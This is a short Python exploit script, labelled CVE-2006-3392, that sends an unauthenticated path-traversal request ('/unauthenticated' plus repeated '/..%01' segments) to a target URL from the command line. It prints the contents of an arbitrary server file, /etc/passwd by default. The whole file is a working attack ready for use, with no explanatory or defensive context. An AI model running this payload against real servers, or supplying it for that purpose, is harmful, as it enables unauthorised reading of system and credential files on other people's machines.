import requests
import argparse
import re

def exploit(target_url, file_path):
    if not re.match(r'^https?://', target_url):
        target_url = f"https://{target_url}"

    payload = "/unauthenticated" + "/..%01" * 20
    try:
        if file_path is None:
            file_path = "/etc/passwd"
        response = requests.get(target_url + payload + file_path)
        print(response.text)

    except requests.exceptions.RequestException as request_error:
        print(f"Error making request for {target_url} -> {request_error.reason}")

def main():
    parser = argparse.ArgumentParser(description="CVE-2006-3392")
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("-f", "--file")

    args = parser.parse_args()
    try:
        exploit(args.target, args.file)
    except KeyboardInterrupt:
        exit(1)
    except EOFError:
        exit(1)

if __name__ == '__main__':
    main()
